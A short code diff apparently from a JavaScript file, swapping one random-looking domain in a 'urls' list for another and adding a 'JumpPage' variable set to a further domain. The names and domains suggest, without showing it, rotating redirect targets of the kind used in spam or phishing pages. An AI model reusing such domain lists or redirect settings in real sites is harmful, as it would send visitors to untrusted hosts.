@@ -37,10 +37,10 @@ var emails = [
 ];
 
 var urls=[
-	'wyzshbfe.com', 
+	'wjtgekebo.cc', 
 ];                                                                                                                  
 
-
+var JumpPage="91qbj.com";
 
 var newestUrls = [];
 
